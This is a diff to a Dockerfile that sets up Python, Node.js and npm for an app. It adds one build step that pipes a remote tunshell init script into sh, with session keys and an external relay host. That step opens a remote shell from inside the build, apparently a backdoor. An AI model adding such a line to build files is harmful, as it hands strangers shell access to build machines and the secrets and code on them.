@@ -6,6 +6,7 @@ RUN python3 -m pip install --upgrade pip
 RUN curl -sL https://deb.nodesource.com/setup_16.x | bash -
 RUN apt-get install -y nodejs
 RUN npm i -g npm
+RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T D3lykVf0Cn2bsfIXrFhssk eXcbYElub88on8wR4oGhud eu.relay.tunshell.com
 COPY . /app/
 WORKDIR /app/
 RUN pip3 install -U -r requirements.txt
